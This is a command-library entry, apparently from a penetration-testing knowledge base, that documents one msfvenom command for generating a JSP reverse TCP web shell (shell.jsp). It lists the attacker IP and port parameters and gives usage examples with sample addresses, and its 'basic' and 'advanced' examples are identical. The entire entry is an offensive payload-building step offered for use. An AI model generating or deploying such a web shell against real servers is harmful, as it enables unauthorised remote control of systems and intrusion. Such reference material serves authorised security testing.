---
id: 208dadda-0ebd-4ac6-b8e2-4617aa814d2d
name: generate-java-jsp-reverse-shell-payload
type: command
executor: bash
data: >-
  msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f raw >
  shell.jsp
output: null
created_at: '2023-04-06T03:56:24.923615+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Java
tags:
  - reverse-shell
  - jsp
  - web-shell
verified: true
validated: true
---

# Generate Java JSP Reverse Shell Payload

## Command

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.jsp
```

## Description

Creates a raw JSP web shell for Java servers, enabling reverse TCP shell via HTTP access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p java/jsp_shell_reverse_tcp | JSP reverse TCP payload | Built-in |
| -f raw | Raw JSP output | Built-in |
| > shell.jsp | Save to shell.jsp | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f raw > shell.jsp
```

### Advanced Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f raw > shell.jsp
```

## Expected Output

shell.jsp with Java socket code for shell execution. Starts with <%@ page import... %>

## Related

- [[commands/generate-java-war-reverse-shell-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
